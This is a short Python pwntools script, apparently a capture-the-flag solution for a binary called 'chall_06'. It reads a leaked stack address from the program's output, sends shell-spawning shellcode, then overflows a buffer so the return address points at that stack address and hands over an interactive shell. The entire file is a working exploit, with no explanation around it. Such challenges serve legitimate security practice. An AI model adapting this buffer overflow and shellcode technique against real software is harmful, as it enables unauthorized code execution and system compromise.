from pwn import *
import re

binary = context.binary = ELF('./chall_06')
p = process(binary.path)
context.arch = "amd64"

resp = p.recv()
stack_leak = int(re.findall(b"(0x[0-9a-f]{6,16})", resp)[0], 16)
log.info('stack: ' + hex(stack_leak))

payload  = b''
payload += asm(shellcraft.sh())

p.sendline(payload)

payload = b'A' * (0x60 - 0x8) + p64(stack_leak)

p.sendline(payload)

p.interactive()